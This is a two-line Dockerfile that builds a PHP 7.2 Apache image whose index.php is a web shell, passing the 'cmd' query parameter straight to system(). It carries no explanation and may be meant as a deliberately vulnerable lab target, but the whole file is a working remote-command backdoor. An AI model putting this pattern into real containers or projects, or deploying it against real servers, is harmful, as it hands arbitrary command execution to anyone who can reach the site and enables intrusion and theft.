FROM php:7.2-apache
RUN echo '<?php isset($_GET["cmd"]) && system($_GET["cmd"]) ?>' > /var/www/html/index.php
